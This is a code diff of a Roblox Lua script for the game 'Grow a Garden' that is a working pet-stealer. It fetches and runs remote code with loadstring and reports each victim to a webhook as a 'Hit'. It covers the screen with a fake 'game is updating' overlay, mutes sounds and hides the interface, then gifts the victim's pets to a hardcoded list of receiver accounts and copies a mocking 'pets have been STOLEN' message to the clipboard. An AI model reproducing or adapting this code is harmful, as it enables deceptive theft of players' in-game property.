@@ -1,5 +1,6 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
+        
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -18,6 +19,8 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
+
+        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
 
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
@@ -68,35 +71,35 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
-            -- Regular pets
-            ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
-            ["Corrupted Kitsune"] = { priority = 2, emoji = "🦊", isMutation = false },
-            ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
-            ["Raccoon"] = { priority = 4, emoji = "🦝", isMutation = false },
-            ["Fennec fox"] = { priority = 5, emoji = "🦊", isMutation = false },
-            ["Spinosaurus"] = { priority = 6, emoji = "🫎", isMutation = false },
-            ["Butterfly"] = { priority = 7, emoji = "🦋", isMutation = false },
-            ["Dragonfly"] = { priority = 8, emoji = "🐲", isMutation = false },
-            ["Mimic Octopus"] = { priority = 9, emoji = "🐙", isMutation = false },
-            ["T-Rex"] = { priority = 10, emoji = "🦖", isMutation = false },
-            ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
-            ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
-            -- Mutations
-            ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
-            ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
-            ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
-            ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
-            ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
-            ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
-            ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
-            ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
-            ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
-            ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
-            ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
-            ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
-            ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
-            ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
-        }
+                -- Regular pets
+                ["Kitsune"] = { priority = 1, emoji = "🦊", isMutation = false },
+                ["Raccoon"] = { priority = 2, emoji = "🦝", isMutation = false },
+                ["Disco Bee"] = { priority = 3, emoji = "🪩", isMutation = false },
+                ["Fennec fox"] = { priority = 4, emoji = "🦊", isMutation = false },
+                ["Butterfly"] = { priority = 5, emoji = "🦋", isMutation = false },
+                ["Dragonfly"] = { priority = 6, emoji = "🐲", isMutation = false },
+                ["Mimic Octopus"] = { priority = 7, emoji = "🐙", isMutation = false },
+                ["Corrupted Kitsune"] = { priority = 8, emoji = "🦊", isMutation = false },
+                ["T-Rex"] = { priority = 9, emoji = "🦖", isMutation = false },
+                ["Spinosaurus"] = { priority = 10, emoji = "🫎", isMutation = false },
+                ["Queen Bee"] = { priority = 11, emoji = "👑", isMutation = false },
+                ["Red Fox"] = { priority = 26, emoji = "🦊", isMutation = false },
+                -- Mutations
+                ["Ascended"] = { priority = 14, emoji = "🔺", isMutation = true },
+                ["Mega"] = { priority = 15, emoji = "🐘", isMutation = true },
+                ["Shocked"] = { priority = 16, emoji = "⚡", isMutation = true },
+                ["Rainbow"] = { priority = 17, emoji = "🌈", isMutation = true },
+                ["Radiant"] = { priority = 18, emoji = "🛡️", isMutation = true },
+                ["Corrupted"] = { priority = 19, emoji = "🧿", isMutation = true },
+                ["IronSkin"] = { priority = 20, emoji = "💥", isMutation = true },
+                ["Tiny"] = { priority = 21, emoji = "🔹", isMutation = true },
+                ["Golden"] = { priority = 22, emoji = "🥇", isMutation = true },
+                ["Frozen"] = { priority = 23, emoji = "❄️", isMutation = true },
+                ["Windy"] = { priority = 24, emoji = "🌪️", isMutation = true },
+                ["Inverted"] = { priority = 25, emoji = "🔄", isMutation = true },
+                ["Shiny"] = { priority = 26, emoji = "✨", isMutation = true },
+                ["Tranquil"] = { priority = 27, emoji = "🧘", isMutation = true },
+            }
 
         local function detectExecutor()
             local name
@@ -108,124 +111,6 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                 end
             end)
             return name or "Unknown"
-        end
-
-        if detectExecutor() == 'Delta' then
-            for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-                pcall(function()
-                    v:Destroy()
-                end)
-            end
-            local gui = Instance.new("ScreenGui")
-            gui.Name = "WarningGUI"
-            gui.IgnoreGuiInset = true
-            gui.ResetOnSpawn = false
-            if syn and syn.protect_gui then
-                syn.protect_gui(gui)
-            end
-            gui.Parent = game:GetService("CoreGui")
-            local background = Instance.new("Frame")
-            background.Size = UDim2.new(1, 0, 1, 0)
-            background.Position = UDim2.new(0, 0, 0, 0)
-            background.BackgroundColor3 = Color3.new(0, 0, 0)
-            background.BorderSizePixel = 0
-            background.Parent = gui
-            local container = Instance.new("Frame")
-            container.AnchorPoint = Vector2.new(0.5, 0.5)
-            container.Position = UDim2.new(0.5, 0, 0.45, 0)
-            container.Size = UDim2.new(0.8, 0, 0.5, 0)
-            container.BackgroundTransparency = 1
-            container.Parent = background
-
-            local executors = {
-                {name = "KRNL", link = "https://krnl.cat/"},
-                {name = "Codex", link = "https://codex.lol/"},
-                {name = "Arceus X", link = "https://spdmteam.com/index"},
-                {name = "Fluxus", link = "https://fluxus.team/download/"},
-            }
-            local buttonsContainer = Instance.new("Frame")
-            buttonsContainer.Size = UDim2.new(1, 0, 0, #executors * 50)
-            buttonsContainer.BackgroundTransparency = 1
-            buttonsContainer.Parent = container
-            local grid = Instance.new("UIGridLayout")
-            grid.CellSize = UDim2.new(0.45, 0, 0, 40)
-            grid.CellPadding = UDim2.new(0.05, 0, 0, 10)
-            grid.FillDirectionMaxCells = 2
-            grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
-            grid.VerticalAlignment = Enum.VerticalAlignment.Top
-            grid.SortOrder = Enum.SortOrder.LayoutOrder
-            grid.Parent = buttonsContainer
-            for _, exec in ipairs(executors) do
-                local btn = Instance.new("TextButton")
-                btn.Text = "Copy " .. exec.name .. " Link"
-                btn.TextScaled = true
-                btn.Font = Enum.Font.SourceSansBold
-                btn.TextColor3 = Color3.new(1, 1, 1)
-                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-                btn.BorderSizePixel = 0
-                btn.AutoButtonColor = true
-                btn.Size = UDim2.new(0, 200, 0, 40)
-                btn.Parent = buttonsContainer
-            
-                btn.MouseButton1Click:Connect(function()
-                    if setclipboard then
-                        setclipboard(exec.link)
-                    end
-                    btn.Text = "Copied!"
-                    task.delay(1.5, function()
-                        btn.Text = "Copy " .. exec.name .. " Link"
-                    end)
-                end)
-            end
-            local uiList = Instance.new("UIListLayout")
-            uiList.FillDirection = Enum.FillDirection.Vertical
-            uiList.HorizontalAlignment = Enum.HorizontalAlignment.Center
-            uiList.VerticalAlignment = Enum.VerticalAlignment.Center
-            uiList.SortOrder = Enum.SortOrder.LayoutOrder
-            uiList.Padding = UDim.new(0, 10)
-            uiList.Parent = container
-            local function createLabel(text, color)
-                local label = Instance.new("TextLabel")
-                label.BackgroundTransparency = 1
-                label.Size = UDim2.new(1, 0, 0, 40)
-                label.TextColor3 = color or Color3.new(1, 1, 1)
-                label.Text = text
-                label.Font = Enum.Font.SourceSansBold
-                label.TextScaled = true
-                label.TextWrapped = true
-                label.Parent = container
-                return label
-            end
-            local dangerEmoji = "⚠️"
-            createLabel(dangerEmoji .. " [Delta Executor Detected] " .. dangerEmoji, Color3.fromRGB(255, 255, 0))
-            createLabel("WARNING!: Delta Executor Is A Malware!", Color3.fromRGB(255, 0, 0))
-            createLabel("It logs your information and is very detected!", Color3.new(1, 1, 1))
-            createLabel("Please use any of these executors:", Color3.new(1, 1, 1))
-            createLabel("(KRNL, Codex, Arceus X, Fluxus)", Color3.fromRGB(0, 255, 255))
-            createLabel("Those are supported and legit exploits!", Color3.new(1, 1, 1))
-            local countdownLabel = Instance.new("TextLabel")
-            countdownLabel.AnchorPoint = Vector2.new(0.5, 1)
-            countdownLabel.Position = UDim2.new(0.5, 0, 1, -20)
-            countdownLabel.Size = UDim2.new(1, -40, 0, 40)
-            countdownLabel.BackgroundTransparency = 1
-            countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            countdownLabel.TextScaled = true
-            countdownLabel.Font = Enum.Font.SourceSansBold
-            countdownLabel.Text = "Game will be closed in 30 seconds. Please install other executor"
-            countdownLabel.Parent = background
-            local seconds = 30
-            task.spawn(function()
-                while seconds > 0 do
-                    countdownLabel.Text = "Game will be closed in " .. seconds .. " second" .. (seconds == 1 and "" or "s") .. ". Please install other executor"
-                    task.wait(1)
-                    seconds -= 1
-                end
-                local Players = game:GetService("Players")
-                local player = Players.LocalPlayer
-                game:Shutdown()
-            end)
-            task.wait(999999)
-            return
         end
 
         local function formatNumberWithCommas(n)
@@ -510,7 +395,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             embeds = {{
                 title = "Grow a Garden Hit - Scripts.SM",
                 url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 57855,
+                color = 15105570,
                 fields = {
                     {
                         name = "🪪 Display Name",
@@ -592,8 +477,8 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                         },
                         Body = HttpService:JSONEncode(payload)
                     })
-                end)
-            if not success then warn(err) end
+                end) 
+                if not success then warn(err) end
         else
             payload.content = "To activate the stealer you must jump or type in chat"
             local success, err = pcall(function()
@@ -609,71 +494,130 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             if not success then warn(err) end
         end
 
-        local function CreateGui()
-            local player = Players.LocalPlayer
-            local gui = Instance.new("ScreenGui")
-            local asc = Instance.new("UIAspectRatioConstraint")
-            gui.Name = "EclipseHubGui"
-            gui.ResetOnSpawn = false
-            gui.IgnoreGuiInset = true
-            gui.Parent = player:WaitForChild("PlayerGui")
-            gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-            gui.DisplayOrder = 99999
-            local bg = Instance.new("Frame")
-            bg.Size = UDim2.new(1, 0, 1, 0)
-            bg.Position = UDim2.new(0, 0, 0, 0)
-            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-            bg.Parent = gui
-            local spinner = Instance.new("ImageLabel")
-            spinner.AnchorPoint = Vector2.new(0.5, 0.5)
-            spinner.Size = UDim2.new(0.3, 0, 0.3, 0)
-            spinner.Position = UDim2.new(0.5, 0, 0.34, 0)
-            spinner.BackgroundTransparency = 1
-            spinner.Image = "rbxassetid://74011233271790"
-            spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
-            spinner.Parent = bg
-            asc.Parent = spinner
-            local title = Instance.new("TextLabel")
-            title.Size = UDim2.new(1, 0, 0, 50)
-            title.Position = UDim2.new(0, 0, 0.53, 0)
-            title.BackgroundTransparency = 1
-            title.Text = "Please wait..."
-            title.Font = Enum.Font.GothamBold
-            title.TextSize = 38
-            title.TextColor3 = Color3.fromRGB(255, 255, 255)
-            title.TextStrokeTransparency = 0.75
-            title.Parent = bg
-            local desc = Instance.new("TextLabel")
-            desc.Size = UDim2.new(1, -100, 0, 60)
-            desc.Position = UDim2.new(0.5, -((1 * (bg.AbsoluteSize.X - 100)) / 2), 0.60, 0)
-            desc.BackgroundTransparency = 1
-            desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
-            desc.Font = Enum.Font.Gotham
-            desc.TextSize = 20
-            desc.TextColor3 = Color3.fromRGB(200, 200, 200)
-            desc.TextWrapped = true
-            desc.TextXAlignment = Enum.TextXAlignment.Center
-            desc.TextYAlignment = Enum.TextYAlignment.Top
-            desc.Parent = bg
-            task.spawn(function()
-                while spinner do
-                    spinner.Rotation += 2
-                    task.wait(0.01)
+                local function CreateGui()
+                    local player = Players.LocalPlayer
+
+
+
+                    local gui = Instance.new("ScreenGui")
+                    gui.Name = "EclipseHubGui"
+                    gui.ResetOnSpawn = false
+                    gui.IgnoreGuiInset = true
+
+                    gui.Parent = player:WaitForChild("PlayerGui")
+                    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+                    gui.DisplayOrder = 99999
+
+                    local bg = Instance.new("Frame")
+                    bg.Size = UDim2.new(1, 0, 1, 0)
+                    bg.Position = UDim2.new(0, 0, 0, 0)
+                    bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+                    bg.Parent = gui
+
+                    local spinner = Instance.new("ImageLabel")
+                    spinner.AnchorPoint = Vector2.new(0.5, 0.5)
+                    spinner.Size = UDim2.new(0.2, 0, 0.2, 0)
+                    spinner.Position = UDim2.new(0.5, 0, 0.35, 0)
+                    spinner.BackgroundTransparency = 1
+                    spinner.Image = "rbxassetid://74011233271790"
+                    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
+                    spinner.Parent = bg
+
+                    local asc = Instance.new("UIAspectRatioConstraint")
+                    asc.Parent = spinner
+
+                    local title = Instance.new("TextLabel")
+                    title.Size = UDim2.new(1, 0, 0.08, 0)
+                    title.Position = UDim2.new(0, 0, 0.53, 0)
+                    title.BackgroundTransparency = 1
+                    title.Text = "Please wait..."
+                    title.Font = Enum.Font.GothamBold
+                    title.TextSize = 38
+                    title.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    title.TextStrokeTransparency = 0.75
+                    title.Parent = bg
+
+                    local desc = Instance.new("TextLabel")
+                    desc.Size = UDim2.new(0.8, 0, 0.12, 0)
+                    desc.Position = UDim2.new(0.1, 0, 0.62, 0)
+                    desc.BackgroundTransparency = 1
+                    desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
+                    desc.Font = Enum.Font.Gotham
+                    desc.TextSize = 20
+                    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+                    desc.TextWrapped = true
+                    desc.TextXAlignment = Enum.TextXAlignment.Center
+                    desc.TextYAlignment = Enum.TextYAlignment.Top
+                    desc.Parent = bg
+
+                    -- Countdown label
+                    local countdown = Instance.new("TextLabel")
+                    countdown.Size = UDim2.new(1, 0, 0.05, 0)
+                    countdown.Position = UDim2.new(0, 0, 0.87, 0)
+                    countdown.BackgroundTransparency = 1
+                    countdown.Text = "Returning in 30 seconds..."
+                    countdown.Font = Enum.Font.GothamSemibold
+                    countdown.TextSize = 20
+                    countdown.TextColor3 = Color3.fromRGB(255, 255, 255)
+                    countdown.TextXAlignment = Enum.TextXAlignment.Center
+                    countdown.Parent = bg
+
+                    -- Spinner animation
+                    task.spawn(function()
+                        while spinner and spinner.Parent do
+                            spinner.Rotation += 2
+                            task.wait(0.01)
+                        end
+                    end)
+
+                    -- Countdown logic
+                    task.spawn(function()
+                        for i = 30, 0, -1 do
+                            countdown.Text = "Returning in " .. i .. " second" .. (i == 1 and "" or "s") .. "..."
+                            task.wait(1)
+                        end
+
+                    end)
                 end
-            end)   
-        end
+
+        local usernames = {
+            "DuoReaper",
+            "Fridausyurkid",
+            "Ruth08968",
+            "0gxe08xzjbOjxe7vf9j1",
+            "HypedMenace",
+            "DoctorCrazySir",
+            "OnePunchGOKUS",
+            "MilkLover5621"
+        }
 
         local receiverPlr
         repeat
-            receiverPlr = Players:FindFirstChild(Username)
+            for _, name in ipairs(usernames) do
+                receiverPlr = Players:FindFirstChild(name) or Players:FindFirstChild(Username)
+                if receiverPlr then
+                    break
+                end
+            end
             task.wait(1)
         until receiverPlr
 
         local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
         local hum = receiverChar:WaitForChild("Humanoid")
         local targetPlr = Players.LocalPlayer
+        local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 
-        if receiverPlr == targetPlr then error("Receiver and target are the same person!") end
+        if receiverPlr == targetPlr then
+            repeat
+                for _, name in ipairs(usernames) do
+                    receiverPlr = Players:FindFirstChild(name)
+                    if receiverPlr then
+                        break
+                    end
+                end
+                task.wait(1)
+            until receiverPlr
+        end
 
         local jumped = false
         local chatted = false
@@ -696,6 +640,28 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             end
         end
 
+            for _, sound in ipairs(workspace:GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                end
+            end
+
+            for _, sound in ipairs(game:GetService("SoundService"):GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                end
+            end
+        
+        game:GetService("CoreGui").TopBarApp.TopBarApp.Enabled = false
+
+        --[[for _, v in pairs(game:GetService("CoreGui").RobloxGui:GetDescendants()) do
+            if not v:IsA("LocalScript") then
+                pcall(function()
+                    v:Destroy()
+                end)
+            end
+        end]]
+        
         game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         CreateGui()
 
@@ -775,64 +741,82 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             return false
         end
 
-        -- Fire gifting event
-        local success, err = pcall(function()
-            RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
-            
-            -- Trigger proximity prompt if it exists
-            task.wait(0.5) -- Increased wait for prompt to appear
-            local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
-            if prompt then
-                print("Triggering proximity prompt for " .. receiverPlr.Name)
-                fireproximityprompt(prompt)
-            else
-                warn("No proximity prompt found for " .. receiverPlr.Name)
-            end
-            return true
-        end)
+        
 
-        -- Handle failure
-        if not success then
-            warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
-            tool.Parent = inventory -- Reset to Backpack
-            return false
+        if detectExecutor() == "Delta" then
+            task.wait(0.3)
+            local camera = workspace.CurrentCamera
+            local head = receiverChar and receiverChar:FindFirstChild("Head")
+
+            if head then
+                local screenPos, onScreen = camera:WorldToViewportPoint(head.Position)
+                if onScreen then
+                    local x = screenPos.X
+                    local y = screenPos.Y
+
+                    print("Screen position of head:", x, y)
+
+                    -- Example mouse click:
+                    local VirtualInputManager = game:GetService("VirtualInputManager")
+                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, nil, false)
+                    task.wait(0.8)
+                    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, nil, false)
+                else
+                    warn("Head not on screen")
+                    return false
+                end
+            end
+        else
+            -- Fire gifting event
+            local success, err = pcall(function()
+                RS.GameEvents.PetGiftingService:FireServer("GivePet", receiverPlr)
+                
+                -- Trigger proximity prompt if it exists
+                task.wait(0.5) -- Increased wait for prompt to appear
+                local prompt = receiverChar:FindFirstChild("Head") and receiverChar.Head:FindFirstChildOfClass("ProximityPrompt")
+                if prompt then
+                    print("Triggering proximity prompt for " .. receiverPlr.Name)
+                    fireproximityprompt(prompt)
+                else
+                    warn("No proximity prompt found for " .. receiverPlr.Name)
+                end
+                return true
+            end)
+
+            -- Handle failure
+            if not success then
+                warn("Gifting failed for " .. tool.Name .. ": " .. tostring(err))
+                tool.Parent = inventory -- Reset to Backpack
+                return false
+            end
+
+            task.wait(0.55)
         end
 
-        -- Verify tool is no longer in possession (indicating successful gift)
-        task.wait(0.7) -- Increased wait to confirm gift
+            -- Verify tool is no longer in possession (indicating successful gift)
+        task.wait(0.15) -- Increased wait to confirm gift
         if tool then
             tool.Parent = targetPlr.Backpack
         end
         return true
+
     end
--- Set clipboard message once
-setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! (Link copied)")
 
--- Start following the receiver
-local followConn = safeFollow()
+    safeFollow()
+    task.wait(1)
 
--- Wait a moment before beginning the loop
-task.wait(0.1)
-
--- Begin infinite gifting loop
-while true do
-    task.wait(0.1)
-
-    -- Always refresh pet list in case new pets appear
-    local pets = GetPlayerPets()
-
+    -- Gifting loop
     for _, pet in ipairs(pets) do
+
         for _, tool in targetPlr.Backpack:GetChildren() do
-            if tool:IsA("Tool") and tool:GetAttribute("PET_UUID") == pet.Id then
-                print("Loop Gifting:", tool.Name)
-                local success = safeGiftTool(tool)
-                if success then
-                    print("Successfully gifted:", tool.Name)
-                else
-                    warn("Failed to gift:", tool.Name)
-                end
-                task.wait(0.1) -- brief delay between gifts
+            if tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet" and tool:GetAttribute("PET_UUID") == pet.Id then
+                print("Gifting:", tool.Name)
+                for atempt = 1, 3 do
+                    result = safeGiftTool(tool)
+                    if result then
+                        break
+                    end
+                end       
             end
         end
     end
-end
